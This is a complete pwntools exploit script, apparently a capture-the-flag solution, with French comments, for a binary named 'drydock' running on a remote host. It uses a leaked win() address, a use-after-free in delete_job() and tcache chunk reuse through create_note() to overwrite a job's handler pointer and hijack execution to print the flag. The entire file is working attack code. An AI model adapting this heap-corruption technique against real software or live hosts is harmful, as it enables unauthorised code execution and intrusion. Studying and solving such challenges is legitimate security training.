#!/usr/bin/env python3
# drydock exploit
# vuln: UAF dans delete_job() + tcache reuse avec create_note()
# le banner nous donne win() directement donc pas besoin de chercher la PIE

from pwn import *

HOST = "95.216.124.220"
PORT = 30224

e = ELF("./drydock", checksec=False)
context.binary = e
# context.log_level = "debug"  # uncomment si ca marche pas

io = remote(HOST, PORT)
# io = process("./drydock")  # local

# le banner imprime: [diag] bay marker=<main> supervisor marker=<win>
io.recvuntil(b"supervisor marker=")
win_addr = int(io.recvuntil(b"\n", drop=True).strip(), 16)
log.success(f"win() @ {hex(win_addr)}")

# create job -> malloc(0x30) -> chunk A
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Job label: ", b"job1")

# delete job -> free chunk A, g_job pas nul -> UAF
io.sendlineafter(b"> ", b"3")

# create note -> tcache retourne chunk A (meme taille 0x30)
# layout: [name: 0x20][handler: +0x20][code][state]
# on ecrase handler avec win_addr
io.sendlineafter(b"> ", b"4")
payload = b"\x00" * 0x20 + p64(win_addr)
io.sendafter(b"payload: ", payload)

# run job -> g_job->handler = win_addr -> call rax -> flag
io.sendlineafter(b"> ", b"6")

io.recvuntil(b"Opening drydock privileged channel...\n")
flag = io.recvline().strip().decode()
print(f"\nFLAG: {flag}")
io.close()
